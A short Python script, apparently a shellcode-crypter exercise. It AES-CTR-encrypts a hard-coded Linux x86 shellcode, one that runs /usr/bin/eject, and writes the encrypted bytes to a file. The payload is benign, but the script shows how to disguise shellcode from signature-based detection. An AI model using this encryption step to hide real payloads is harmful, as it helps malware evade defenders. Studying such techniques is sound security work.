#!/usr/bin/env python

import pyaes


key = "b33rb44rb55rb66rb77rb88rb99rb00r"
aes = pyaes.AESModeOfOperationCTR(key)
shellcode = "\x31\xc0\xb0\x0b\x51\x68\x6a\x65\x63\x74\x68\x6e\x2f\x2f\x65\x68\x72\x2f\x62\x69\x68\x2f\x2f\x75\x73\x89\xe3\x51\x53\x89\xe1\xcd\x80\x04\x01\xcd\x80"

shellcodeenc = aes.encrypt(shellcode)
shellcodeenc2 = ""
for x in bytearray(shellcodeenc) :
	shellcodeenc2 += '\\x'
        shellcodeenc2 += '%02x' % x
body = '""{}""'.format(shellcodeenc2)

f = open("body","w")
f.write(body)
f.close()



